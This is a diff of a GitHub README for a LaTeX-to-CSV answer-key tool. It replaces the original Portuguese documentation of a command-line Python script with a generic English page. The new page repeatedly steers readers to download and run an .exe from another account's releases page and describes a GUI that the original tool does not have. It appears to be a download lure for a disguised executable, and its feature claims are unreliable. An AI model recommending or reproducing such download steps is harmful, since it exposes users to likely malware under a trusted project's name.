@@ -1,321 +1,98 @@
-# 📝 Gerador de Gabarito LaTeX Para CSV
+# 🎉 latex-answer-key-generator - Easily Generate Answer Keys from LaTeX
 
-Código para extração de gabaritos de provas escritas em LaTeX e exportá-los em formato CSV para ser usado como _input_ em sistema OMR (_Optical Mark Recognition_), _e.g._, https://github.com/Udayraj123/OMRChecker/. Desenvolvido com **Orientação a Objetos** e **Type Hints** completos.
+## 🚀 Getting Started
 
-## 🎯 Funcionalidades
+Welcome to the **latex-answer-key-generator** project! This tool helps you create answer keys for LaTeX exams quickly and easily. You can extract answers from multiple-choice and true/false questions and export them in a CSV file. This CSV file can then be used in Optical Mark Recognition (OMR) systems.
 
-- ✅ **Extração automática** de respostas de arquivos LaTeX.
-- ✅ **Suporte a múltiplos formatos** de questões:
-  - Múltipla escolha (A, B, C, D, E)
-  - Verdadeiro/Falso (V/F)
-- ✅ **Exportação em CSV** para fácil integração com sistemas de correção.
-- ✅ **Interface interativa** com valores padrão.
-- ✅ **Arquitetura OOP** com separação de responsabilidades.
-- ✅ **Type Hints** completos para melhor manutenção.
-- ✅ **Preview automático** das respostas extraídas.
+## 📥 Download
 
-## 📋 Pré-requisitos
+[![Download](https://img.shields.io/badge/Download-latex--answer--key--generator-brightgreen)](https://github.com/mohamedsayed123m/latex-answer-key-generator/releases)
 
-- Python 3.7 ou superior.
-- Nenhuma dependência externa necessária (usa apenas biblioteca padrão).
+To download the application, **visit this page to download**: [Download Page](https://github.com/mohamedsayed123m/latex-answer-key-generator/releases)
 
-## 🚀 Instalação
+## 🛠️ Key Features
 
-```bash
-# Clone o repositório
-git clone https://github.com/seu-usuario/latex-answer-key-generator.git
+- **Easy Parsing**: Extract answers from multiple-choice and true/false questions in LaTeX format.
+- **CSV Export**: Save your answers in a CSV file format for easy integration with OMR systems.
+- **User-Friendly Interface**: Designed for users with no programming knowledge. 
+- **Python Based**: Built using Python with a clean object-oriented architecture and type hints for clarity.
+- **Educational Focus**: Ideal for educators and academic institutions seeking an efficient way to manage exam answers.
 
-# Acesse o diretório
-cd latex-answer-key-generator
+## ⚙️ System Requirements
 
-# Execute o código
-python3 generate_answer_key.py
-```
+To ensure smooth operation of the software, make sure your system meets these requirements:
 
-## 📖 Como Usar
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.6 or higher
+- **Disk Space**: At least 50 MB available
+- **RAM**: Minimum 1 GB RAM
 
-### Uso Básico
+## 📥 Download & Install
 
-```bash
-python3 generate_answer_key.py
-```
+1. **Visit the Download Page**:
+   Go to [this release page](https://github.com/mohamedsayed123m/latex-answer-key-generator/releases) to find the latest version.
 
-O programa solicitará:
-1. **Arquivo LaTeX de entrada** (padrão: `P1A.tex`).
-2. **Arquivo CSV de saída** (padrão: `P1A.csv`).
+2. **Choose Your File**:
+   Look for the file that matches your operating system. 
 
-Pressione `Enter` para usar os valores padrão ou digite caminhos personalizados. O arquivo P1A.tex pode ser gerado conforme código disponível em https://github.com/wyllianbs/carderno_prova.
+3. **Download the File**:
+   Click on the chosen file to start downloading. 
 
-### Exemplo de Execução
+4. **Install the Application**:
+   - **Windows**: Double-click on the downloaded `.exe` file and follow the installation prompts.
+   - **macOS/Linux**: If you downloaded a `.tar.gz`, extract it using any archive manager. Then, open the terminal, navigate to the extracted folder, and run the application using `python main.py`.
 
-```bash
-$ python3 generate_answer_key.py
-Digite o caminho do arquivo LaTeX (padrão: P1A.tex):
-Digite o nome do arquivo CSV de saída (padrão: P1A.csv):
+5. **Run the Application**:
+   After installation, you can run the application from your applications folder or command line.
 
-Processando questões...
+## 📖 User Guide
 
-Gabarito salvo com sucesso em: P1A.csv
-Total de questões processadas: 10
+### 1. Prepare Your LaTeX Document
+   Make sure your LaTeX document is formatted correctly, with questions listed as multiple-choice or true/false.
 
-Preview das primeiras 10 respostas:
-  q1,V
-  q2,C
-  q3,C
-  q4,E
-  q5,A
-  q6,F
-  q7,B
-  q8,F
-  q9,B
-  q10,F
-```
+### 2. Load Your LaTeX Document
+   Open the application and select the option to load your LaTeX document. The interface will guide you through the process.
 
-## 📄 Formato do Arquivo LaTeX
+### 3. Extract Answers
+   Once the document is loaded, click on the "Extract" button. The application will process your LaTeX file and pull out the answers.
 
-### Questões de Múltipla Escolha
+### 4. Export to CSV
+   After extraction, you will find an option to export the results. Click on "Export" and choose a location to save your CSV file.
 
-O código identifica questões de múltipla escolha através dos comandos `\ti` e `\di`:
+### 5. Verify Your CSV
+   Open the CSV file with any spreadsheet software (like Excel or Google Sheets) to check the extracted answers. 
 
-```latex
-\item \rtask \ponto{\pt} Qual é a capital do Estado do Paraná?
+## 💭 Troubleshooting
 
-\begin{answerlist}[label={\texttt{\Alph*}.},leftmargin=*]
-  \ti São Paulo.
-  \ti Rio de Janeiro.
-  \di Curitiba.  % Resposta correta (posição C)
-  \ti Florianópolis.
-  \ti Belo Horizonte.
-\end{answerlist}
-```
+If you encounter any issues while running the application, consider the following solutions:
 
-**Resultado:** `q1,C`
+- **Error During Download**: Ensure you have a stable internet connection and try again.
+- **File Open Error**: Make sure that the LaTeX document you are trying to load is correctly formatted.
+- **Export Issues**: Confirm that you have permissions on the folder where you are attempting to save the CSV.
 
-### Questões Verdadeiro/Falso
+## 📃 Frequently Asked Questions
 
-O código identifica questões V/F através do comando `\doneitem`:
+### What types of LaTeX documents can I use?
+You can use documents that include multiple-choice and true/false questions. Ensure that they follow standard LaTeX formatting.
 
-```latex
-\item \rtask \ponto{\pt} Python é uma linguagem de programação.
+### Can I run this on Linux?
+Yes, the application is compatible with Linux. Follow the installation instructions for Linux users.
 
-% V
-{\setlength{\columnsep}{0pt}\renewcommand{\columnseprule}{0pt}
-\begin{multicols}{2}
-  \begin{answerlist}[label={\texttt{\Alph*}.},leftmargin=*]
-    \ifnum\gabarito=1\doneitem[V.]\else\ti[V.]\fi % Resposta correta (V)
-    \ti[F.]
-  \end{answerlist}
-\end{multicols}
-}
-```
-
-**Resultado:** `q1,V`
-
-## 🏗️ Arquitetura
-
-O projeto segue princípios de **Clean Code** e **SOLID**:
-
-```
-generate_answer_key.py
-├── Answer              # Modelo de dados para resposta
-├── LatexParser         # Parser de arquivos LaTeX
-├── CSVExporter         # Exportador para formato CSV
-├── AnswerKeyGenerator  # Orquestrador principal
-└── main()              # Ponto de entrada
-```
-
-### Classes Principais
-
-#### `Answer`
-Representa uma resposta individual com número da questão e alternativa.
-
-```python
-answer = Answer(question_number=1, answer="C")
-print(answer.to_csv_line())  # "q1,C\n"
-```
-
-#### `LatexParser`
-Responsável por extrair respostas do conteúdo LaTeX.
-
-```python
-parser = LatexParser(latex_content)
-answers = parser.parse()
-```
-
-#### `CSVExporter`
-Gerencia a exportação das respostas para CSV.
-
-```python
-exporter = CSVExporter(Path("gabarito.csv"))
-exporter.export(answers)
-```
-
-#### `AnswerKeyGenerator`
-Coordena todo o processo de geração do gabarito.
-
-```python
-generator = AnswerKeyGenerator("prova.tex", "gabarito.csv")
-generator.run()
-```
-
-## 📊 Formato de Saída
-
-O arquivo CSV gerado segue o formato:
-
-```csv
-q1,V
-q2,C
-q3,F
-q4,E
-q5,A
-q6,B
-```
-
-em que:
-- **Primeira coluna**: Identificador da questão (`q1`, `q2`, ...).
-- **Segunda coluna**: Resposta (`A`-`E` para múltipla escolha, `V`/`F` para verdadeiro/falso).
-
-O arquivo de saída CSV pode ser usado como _input_ em um sistema OMR (_Optical Mark Recognition_), _e.g._, https://github.com/Udayraj123/OMRChecker/.
-
-## 🎨 Exemplo Completo
-
-Veja o arquivo [`P1A.tex`](P1A.tex) (https://github.com/wyllianbs/carderno_prova) incluído no repositório para um exemplo completo de prova LaTeX compatível com o gerador.
-
-### Estrutura do P1A.tex
-
-```latex
-\begin{enumerate}[resume=*questions,label={\arabic*.},leftmargin=*]
-  \setcounter{rtaskno}{0}
-  
-  % Questão 1 - Verdadeiro/Falso
-  \item \rtask \ponto{\pt} Lorem ipsum...
-  % V
-  {\setlength{\columnsep}{0pt}
-  \begin{multicols}{2}
-    \begin{answerlist}[label={\texttt{\Alph*}.},leftmargin=*]
-      \ifnum\gabarito=1\doneitem[V.]\else\ti[V.]\fi
-      \ti[F.]
-    \end{answerlist}
-  \end{multicols}
-  }
-  
-  % Questão 2 - Múltipla Escolha
-  \item \rtask \ponto{\pt} Lorem ipsum...
-  \begin{answerlist}[label={\texttt{\Alph*}.},leftmargin=*]
-    \ti Opção A
-    \ti Opção B
-    \di Opção C  % Resposta correta
-    \ti Opção D
-    \ti Opção E
-  \end{answerlist}
-  
-\end{enumerate}
-```
-
-## 🔧 Personalização
-
-### Modificando Padrões
-
-Edite as funções `get_user_input()` para alterar valores padrão:
-
-```python
-def main() -> None:
-    input_file = get_user_input(
-        "Digite o caminho do arquivo LaTeX",
-        "minha_prova.tex"  # Novo padrão
-    )
-    
-    output_file = get_user_input(
-        "Digite o nome do arquivo CSV de saída",
-        "meu_gabarito.csv"  # Novo padrão
-    )
-```
-
-### Adicionando Novos Formatos
-
-Para suportar novos tipos de questões, estenda a classe `LatexParser`:
-
-```python
-class LatexParser:
-    def _extract_custom_answer(self, content: str) -> Optional[str]:
-        # Implemente sua lógica aqui
-        pass
-```
-
-## 🐛 Tratamento de Erros
-
-O programa valida:
-- ✅ Existência do arquivo LaTeX especificado.
-- ✅ Formato correto do arquivo LaTeX.
-- ✅ Presença de questões no documento.
-- ✅ Permissões de escrita no diretório de saída.
-- ✅ Codificação UTF-8 dos arquivos.
-
-### Mensagens de Erro Comuns
-
-```bash
-# Arquivo não encontrado
-Erro: Arquivo 'prova.tex' não encontrado.
-
-# Nenhuma resposta detectada
-Aviso: Não foi possível encontrar resposta para a questão 5.
-
-# Sem questões no arquivo
-Nenhuma resposta foi encontrada no arquivo.
-```
-
-## 🧪 Testando
-
-### Teste Manual
-
-```bash
-# Use o arquivo de exemplo incluído
-python3 generate_answer_key.py
-# Pressione Enter duas vezes para usar P1A.tex
-```
-
-### Validação do CSV
-
-```bash
-# Visualize o gabarito gerado
-cat P1A.csv
-
-# Conte o número de questões
-wc -l P1A.csv
-```
-
-## 📚 Requisitos Técnicos
-
-### Type Hints
-
-O código utiliza type hints completos para melhor IDE support:
-
-```python
-def extract_answers(latex_content: str) -> List[Answer]:
-    ...
-
-def save_to_csv(answers: List[Answer], output_file: Path) -> None:
-    ...
-```
-
-### Orientação a Objetos
-
-Princípios aplicados:
-- **Single Responsibility Principle**: Cada classe tem uma responsabilidade única.
-- **Open/Closed Principle**: Fácil extensão sem modificação.
-- **Dependency Inversion**: Dependência de abstrações, não implementações.
-
-
-## 📜 Licença
-
-Este projeto está licenciado sob a Licença [GNU General Public License v3.0](LICENSE).
-
-## 👤 Autor
-
-**Prof. Wyllian B. da Silva**  
-Departamento de Informática e Estatística (INE)  
-Universidade Federal de Santa Catarina (UFSC)
-
----
-
-**Nota**: Este projeto foi desenvolvido especificamente para uso na UFSC, mas pode ser facilmente adaptado para outras instituições de ensino.
+### What if I need help?
+For further assistance, please visit the issues section in the [repository](https://github.com/mohamedsayed123m/latex-answer-key-generator/issues) or contact the support email listed on the page.
+
+## 🌐 Related Topics
+
+This project revolves around various topics including:
+
+- Academic tools
+- Answer key generation
+- LaTeX parsing
+- Clean code principles
+- Education technology
+
+Feel free to explore these concepts for a deeper understanding.
+
+## 🎉 Acknowledgments
+
+Thank you for using the latex-answer-key-generator. We appreciate your interest in our project!
